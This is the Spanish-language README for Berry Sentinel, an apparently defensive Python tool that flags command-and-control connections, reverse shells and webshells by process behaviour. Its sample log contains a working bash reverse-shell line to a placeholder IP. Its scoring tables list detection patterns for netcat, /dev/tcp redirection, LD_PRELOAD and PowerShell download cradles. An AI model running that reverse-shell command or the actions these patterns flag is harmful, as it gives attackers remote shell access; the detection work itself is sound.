# 🫐 Berry Sentinel

**Detector conductual de conexiones C2 (Command & Control) en tiempo real**

Zero-signature · Bulletproof Collection · Deep Scan · Kill Engine

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows%20%7C%20Android-lightgrey)](https://github.com/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## ¿Qué es?

Berry Sentinel monitorea todas las conexiones de red activas en tu sistema y analiza el **comportamiento** de los procesos que las generan para detectar actividad maliciosa — sin usar bases de datos de firmas de antivirus ni listas de IPs bloqueadas.

Detecta reverse shells, webshells, RATs, beacons C2 y frameworks como Meterpreter, Cobalt Strike, Sliver o Empire observando **cómo se comporta** un proceso: si un intérprete de Python tiene su stdin conectado a un socket remoto, eso es sospechoso aunque la IP sea desconocida.

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  BERRY SENTINEL v5.0 — Detector Conductual C2 · TUI Interactivo               ║
║  Conexiones: 38 │ Amenazas: 2 │ Firmas: 1 │ via proc/open+ss │ 12ms │ #47    ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║ ID  SEV      PTS   PID    PROC    REMOTO                ESTADO  FIRMAS/TAGS    ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  3  █CRÍTICO  85   1337   bash    1.2.3.4:4444   ESTAB  ⚑Meterpreter SHELL→NET║
║  7  ▲ALTO     52   2048   python3 5.6.7.8:8443   ESTAB  TLS-NOBR BCN(60s)     ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

---

## Características

- **TUI interactivo** con curses: navegación ↑↓, detalle de conexión, kill engine integrado
- **Análisis conductual puro**: sin firmas de AV, sin listas negras de IPs
- **Detección de beacon**: identifica conexiones C2 por sus intervalos regulares (Cobalt Strike ~60s, Empire ~5s, etc.)
- **14+ frameworks C2** reconocidos: Meterpreter, Cobalt Strike, Sliver, Empire, Havoc, Brute Ratel, Pupy, Merlin, Covenant, Mythic...
- **Deep scan** (con root): analiza memoria del proceso, regiones RWX, variables de entorno, ejecutables borrados del disco
- **Bulletproof collection**: usa 5 métodos de recolección en paralelo (/proc/net, ss, netstat, psutil, lsof) con deduplicación automática
- **Cross-platform**: Linux, macOS, Windows, Android/Termux
- **Exportación JSON y log**: alertas en formato JSONL compatible con jq, ELK, Splunk
- **Whitelist**: ignorar IPs o redes de confianza por CIDR
- **Zero dependencias** en modo básico (solo stdlib); `psutil` opcional para cobertura extra

---

## Instalación

```bash
# Clonar el repositorio
git clone https://github.com/dereeqw/BerrySentinel.git
cd BerrySentinel 

# (Opcional pero recomendado) instalar psutil
pip install psutil

# Ejecutar
python3 BerrySentinel.py
```

### Android / Termux

```bash
pkg install python
pip install psutil
python3 BerrySentinel.py --no-tui  # curses puede no estar disponible en Termux
```

### Sin instalación (one-liner)

```bash
curl -O https://raw.githubusercontent.com/dereeqw/BerrySentinel/main/BerrySentinel 
python3 BerrySentinel.py
```

---

## Uso

```
python3 BerrySentinel.py [opciones]

Opciones:
  --all, -a           Incluir conexiones locales/loopback (además de remotas)
  --interval N, -i N  Refresco cada N segundos (default: 2, mín: 0.5)
  --log FILE, -l FILE Guardar alertas en archivo (formato JSONL)
  --json, -j          Exportar JSON completo al salir
  --whitelist LISTA   IPs o CIDRs a ignorar, separadas por coma
  --no-color          Sin colores ANSI (útil para pipes o logs)
  --verbose, -v       Mostrar todas las conexiones, no solo las sospechosas
  --top N, -t N       Máximo de filas en la tabla (default: 50)
  --diag, -d          Diagnóstico: muestra qué métodos de colección funcionan
  --no-tui            Modo legacy sin curses (scroll clásico, más portable)
  --version, -V       Mostrar versión y salir
```

### Ejemplos

```bash
# TUI interactivo — modo recomendado
python3 BerrySentinel.py

# Deep scan con root (accede a memoria de procesos)
sudo python3 BerrySentinel.py --all

# Guardar alertas y exportar JSON al terminar
python3 BerrySentinel.py --log /var/log/sentinel.log --json

# Ignorar red interna y refrescar cada 5 segundos
python3 BerrySentinel.py --whitelist 192.168.0.0/16,10.0.0.0/8 --interval 5

# Modo texto para usar en scripts o por SSH sin terminal interactiva
python3 BerrySentinel.py --no-tui --no-color | tee monitoring.txt

# Ver qué métodos de colección funcionan en el sistema actual
python3 BerrySentinel.py --diag --no-tui

# Solo alertas graves, actualización cada 10 segundos, guardar log
sudo python3 BerrySentinel.py --all --interval 10 --log sentinel.log --json
```

---

## Teclas del TUI interactivo

| Tecla | Acción |
|-------|--------|
| `↑` / `↓` | Navegar entre conexiones |
| `d` / `D` | Ver panel de detalles de la conexión seleccionada |
| `k` / `K` | Matar proceso (pide confirmación del PID) |
| `f` / `F` | Ciclar filtro de severidad: ALL → MEDIO → ALTO → CRÍTICO |
| `r` | Forzar refresco inmediato |
| `ESC` | Cerrar panel de detalles o cancelar operación |
| `q` | Salir |

---

## Sistema de puntuación

Cada conexión recibe un **score de 0 a 100** según los indicadores detectados:

| Indicador | Puntos | Tag |
|-----------|--------|-----|
| stdin/stdout → socket | +55 | `FD→SOCK` |
| Shell binario con conexión remota | +40 | `SHELL→NET` |
| Webshell (shell como hijo de Apache/Nginx) | +35 | `WEBSHELL` |
| Bind shell en puerto alto | +35 | `BIND-SHELL` |
| Uso de netcat/socat | +35 | `NETCAT` |
| Redirección `/dev/tcp` o `mkfifo` | +40 | `PIPE-REDIR` |
| Ejecutable borrado del disco | +25 | `EXE-DEL!` |
| Ejecutable en `/tmp` o `/dev/shm` | +15 | `EXE-TMP` |
| Beacon detectado (conexión cíclica) | +25×conf | `BCN(60s)` |
| Firma Meterpreter | +55 | `SIG:Meterpreter` |
| Firma Cobalt Strike | +60 | `SIG:CobaltStrike` |
| Firma Sliver | +58 | `SIG:Sliver` |
| Regiones de memoria RWX | +20 | `RWX(N)` |
| LD_PRELOAD o HISTFILE=/dev/null | +10 | `ENV:LD_PRELOAD` |
| Intérprete de scripts conectado | +25 | `INTERP→NET` |
| eval/exec en línea de comandos | +18 | `EVAL` |
| PowerShell remoto (IEX, DownloadString) | +30 | `PS-REM` |

**Severidad según score:**

| Score | Severidad | Color |
|-------|-----------|-------|
| ≥ 65 | CRÍTICO | 🔴 Rojo brillante |
| ≥ 45 | ALTO | 🟠 Naranja |
| ≥ 25 | MEDIO | 🟡 Amarillo |
| ≥ 8 | BAJO | 🔵 Cyan |
| < 8 | INFO | ⚪ Gris |

---

## Frameworks C2 detectados

Berry Sentinel incluye firmas para los siguientes frameworks (evaluación por puertos, nombre de proceso, línea de comandos y patrones de beacon):

| Framework | Score bonus | Indicadores clave |
|-----------|------------|-------------------|
| Meterpreter | +55 | Puerto 4444, proceso ruby/msfconsole |
| Cobalt Strike | +60 | Puerto 50050, beacon ~60s, proceso java |
| Sliver | +58 | Puerto 31337/8888, beacon ~60s |
| Empire | +55 | Puerto 1234/7777, PowerShell -enc |
| Brute Ratel | +62 | Puerto 2083, proceso badger |
| Havoc | +58 | Puerto 40056, demon.x64/x86 |
| Pupy RAT | +52 | Puerto 9999, pupy.py |
| Merlin | +54 | Puerto 8443, merlin-agent |
| Covenant | +54 | Puerto 7443, GruntHTTP |
| PoshC2 | +52 | FComServer, ImplantCore |
| Mythic | +56 | Puerto 7443, poseidon/apfell |
| QuasarRAT | +50 | Puerto 4782-4785 |
| NetcatShell | +45 | socat exec bash, pty |
| DNS-C2 | +40 | Puerto 53, dnscat/iodine |

---

## Formato de log (JSONL)

Cada alerta se registra como una línea JSON independiente:

```json
{
  "ts": "2025-07-15T14:23:01.123456",
  "id": 42,
  "sev": "CRÍTICO",
  "score": 85.0,
  "pid": 1337,
  "name": "bash",
  "cmd": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
  "remote": "1.2.3.4:4444",
  "local": "192.168.1.10:52341",
  "state": "ESTABLISHED",
  "tags": ["SHELL→NET", "PIPE-REDIR", "C2P(4444)"],
  "sigs": ["Meterpreter"],
  "src": "proc/open(self)+ss+netstat"
}
```

Procesar con `jq`:
```bash
# Filtrar solo conexiones críticas
jq 'select(.sev == "CRÍTICO")' sentinel.log

# Ver todos los PIDs sospechosos
jq '[.pid] | unique' sentinel_export.json

# Buscar por firma específica
jq 'select(.sigs | contains(["CobaltStrike"]))' sentinel.log
```

---

## Arquitectura

```
BerrySentinel.py
├── Constantes globales
│   ├── SHELL_BINS, SCRIPT_ENGINES  — Nombres de shells e intérpretes
│   ├── C2_SUSPECT_PORTS            — Puertos típicos de C2
│   ├── PRIVATE_NETS                — Rangos IP privados
│   └── C2_SIGNATURES               — Firmas de frameworks conocidos
│
├── Modelos de datos
│   ├── C2Signature   — Definición de firma C2
│   ├── ProcInfo      — Info de proceso del SO
│   ├── Conn          — Conexión de red + resultado análisis
│   └── BeaconTracker — Detector de beacons C2
│
├── Colección de datos
│   ├── Collector     — Orquesta múltiples fuentes de red
│   ├── parse_proc_net_content() — Parser /proc/net/*
│   ├── build_inode_pid_map()    — Mapa inode→PID
│   ├── get_proc_info()          — Info proceso vía /proc
│   └── get_proc_info_psutil()   — Info proceso vía psutil
│
├── Análisis
│   ├── Engine.analyze()    — Score + tags conductuales
│   ├── Engine._beacon()    — Detección de beacons
│   └── match_signatures()  — Matching de firmas C2
│
├── Output
│   ├── CursesTUI   — TUI interactivo (modo por defecto)
│   ├── LegacyTUI   — Output ANSI sin curses (fallback)
│   └── Logger      — Log JSONL en disco
│
└── Sentinel        — Orquestador principal
```

---

## Requisitos

- **Python 3.8+**
- `psutil` — opcional pero muy recomendado (`pip install psutil`)

Sin dependencias adicionales la herramienta funciona con la stdlib de Python. `psutil` añade cobertura en macOS y Windows donde `/proc` no existe.

---

## Plataformas

| Sistema | Soporte | Notas |
|---------|---------|-------|
| Linux | ✅ Completo | Con root activa deep scan |
| Android/Termux | ✅ Completo | Usa `--no-tui` si curses falla |
| macOS | ⚠️ Parcial | Sin /proc; usa netstat+psutil |
| Windows | ⚠️ Parcial | netstat+psutil, sin análisis de memoria |

---

## Personalización

### Añadir firma C2 propia

```python
from BerrySentinel import C2Signature, C2_SIGNATURES

mi_rat = C2Signature(
    name="MiRAT",
    description="RAT interno corporativo no autorizado",
    score_bonus=70,
    checks=[
        {"type": "port", "value": 6543},
        {"type": "cmdline", "value": r"mi_rat\.py|rat_agent"},
        {"type": "procname", "value": r"^mi_rat$"},
    ],
)
C2_SIGNATURES.append(mi_rat)
```

### Usar como librería en un script

```python
import argparse
from BerrySentinel import Sentinel, Sev

args = argparse.Namespace(
    all=True, interval=10, log=None, json=False,
    whitelist="192.168.0.0/16", no_color=True,
    verbose=False, top=100, diag=False, no_tui=True
)

s = Sentinel(args)
s._cycle_data()

for conn in s.last_conns:
    if conn.severity >= Sev.HIGH:
        proc = conn.proc
        print(f"[ALERTA] PID {conn.pid} ({proc.name if proc else '?'}) "
              f"→ {conn.remote_addr}:{conn.remote_port} "
              f"score={conn.score:.0f} tags={conn.tags}")
```

### Motor de análisis personalizado

```python
from BerrySentinel import Engine, Conn, Sev

class MiEngine(Engine):
    KNOWN_C2_IPS = {"203.0.113.1", "198.51.100.42"}

    def analyze(self, c: Conn) -> Conn:
        c = super().analyze(c)
        # Añadir lógica propia
        if c.remote_addr in self.KNOWN_C2_IPS:
            c.score = min(c.score + 40, 100)
            c.tags.append("KNOWN-IOC-IP")
            c.severity = Sev.CRITICAL
        return c
```

---

## Advertencia de uso responsable

Berry Sentinel está diseñado para **monitorear tu propio sistema** o sistemas sobre los que tienes autorización explícita. El Kill Engine solo actúa cuando el usuario lo solicita explícitamente. Úsalo de forma responsable y de acuerdo con las leyes aplicables en tu jurisdicción.

---

## Licencia

MIT — ver [LICENSE](LICENSE)
